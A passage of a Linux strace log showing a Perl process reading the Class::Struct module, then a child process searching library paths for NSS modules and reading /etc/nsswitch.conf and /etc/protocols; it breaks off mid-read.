$out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
13033 07:45:20.119880 _llseek(10, 6916, [6916], SEEK_SET) = 0
13033 07:45:20.119937 _llseek(10, 0, [6916], SEEK_CUR) = 0
13033 07:45:20.119964 close(10)         = 0
13033 07:45:20.128388 _llseek(8, 1334, [1334], SEEK_SET) = 0
13033 07:45:20.128407 _llseek(8, 0, [1334], SEEK_CUR) = 0
13033 07:45:20.128418 close(8)          = 0
13033 07:45:20.129016 brk(0x82ff000)    = 0x82ff000
13033 07:45:20.129178 _llseek(6, 2689, [2689], SEEK_SET) = 0
13033 07:45:20.129195 _llseek(6, 0, [2689], SEEK_CUR) = 0
13033 07:45:20.129206 close(6)          = 0
13033 07:45:20.129357 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d54908) = 13034
13034 07:45:20.129453 getppid()         = 13033
13034 07:45:20.129887 open("/etc/nsswitch.conf", O_RDONLY) = 6
13034 07:45:20.129911 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
13034 07:45:20.129930 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f1a000
13034 07:45:20.129945 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
13034 07:45:20.129995 read(6, "", 4096) = 0
13034 07:45:20.130006 close(6)          = 0
13034 07:45:20.130016 munmap(0xb7f1a000, 4096) = 0
13034 07:45:20.130043 open("/etc/ld.so.cache", O_RDONLY) = 6
13034 07:45:20.130056 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
13034 07:45:20.130073 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d21000
13034 07:45:20.130084 close(6)          = 0
13034 07:45:20.130095 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
13034 07:45:20.130113 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130137 stat64("/lib/tls/i686/sse2/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130179 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130207 stat64("/lib/tls/i686/sse2", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130219 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130232 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
13034 07:45:20.130251 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130263 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
13034 07:45:20.130280 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130293 stat64("/lib/tls/sse2/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130304 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130316 stat64("/lib/tls/sse2", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130327 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130340 stat64("/lib/tls/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130351 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130362 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
13034 07:45:20.130385 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130398 stat64("/lib/i686/sse2/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130409 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130421 stat64("/lib/i686/sse2", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130432 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130444 stat64("/lib/i686/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130455 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130467 stat64("/lib/i686", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130478 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130490 stat64("/lib/sse2/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130501 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130513 stat64("/lib/sse2", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130523 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130535 stat64("/lib/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130546 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130557 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
13034 07:45:20.130574 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130588 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130599 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130612 stat64("/usr/lib/tls/i686/sse2", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130624 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130644 stat64("/usr/lib/tls/i686/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130656 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130668 stat64("/usr/lib/tls/i686", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130679 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130692 stat64("/usr/lib/tls/sse2/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130704 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130716 stat64("/usr/lib/tls/sse2", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130727 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130740 stat64("/usr/lib/tls/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130751 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130763 stat64("/usr/lib/tls", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130774 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130787 stat64("/usr/lib/i686/sse2/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130799 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130811 stat64("/usr/lib/i686/sse2", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130823 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130835 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
13034 07:45:20.130853 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130869 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
13034 07:45:20.130886 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130898 stat64("/usr/lib/sse2/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130910 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130922 stat64("/usr/lib/sse2", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130933 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130945 stat64("/usr/lib/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.130956 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130968 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
13034 07:45:20.130985 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.130999 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.131011 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.131025 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.131037 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.131050 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.131063 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.131076 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.131087 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.131101 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.131113 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.131131 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139152 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139173 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139185 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139198 stat64("/lib/i486-linux-gnu/tls", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139210 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139224 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139236 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139249 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139261 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139274 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139286 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139299 stat64("/lib/i486-linux-gnu/i686", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139310 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139323 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139339 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139352 stat64("/lib/i486-linux-gnu/sse2", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139364 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139376 stat64("/lib/i486-linux-gnu/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139388 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139400 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
13034 07:45:20.139419 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139433 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139446 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139460 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139472 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139486 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139499 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139512 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139524 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139537 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139550 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139563 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139575 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139589 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139601 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139614 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139625 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139648 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139661 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139675 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139687 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139700 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139713 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139725 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139738 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139751 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139763 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139776 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139791 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139804 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfcab93c) = -1 ENOENT (No such file or directory)
13034 07:45:20.139817 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
13034 07:45:20.139829 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
13034 07:45:20.139849 munmap(0xb7d21000, 29913) = 0
13034 07:45:20.139873 open("/etc/ld.so.cache", O_RDONLY) = 6
13034 07:45:20.139886 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
13034 07:45:20.139902 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d21000
13034 07:45:20.139913 close(6)          = 0
13034 07:45:20.139924 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
13034 07:45:20.139939 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
13034 07:45:20.139955 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
13034 07:45:20.140047 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
13034 07:45:20.140071 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d16000
13034 07:45:20.140084 mmap2(0xb7d1f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7d1f000
13034 07:45:20.140101 close(6)          = 0
13034 07:45:20.140125 munmap(0xb7d21000, 29913) = 0
13034 07:45:20.140154 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
13034 07:45:20.140171 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
13034 07:45:20.140187 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
13034 07:45:20.140204 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d28000
13034 07:45:20.140215 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
13034 07:45:20.140405 close(6)          = 0
13034 07:45:20.140416 munmap(0xb7d28000, 4096) = 0
13034 07:45:20.140436 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
13034 07:45:20.140449 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
13034 07:45:20.140466 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d28000
13034 07:45:20.140476 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# 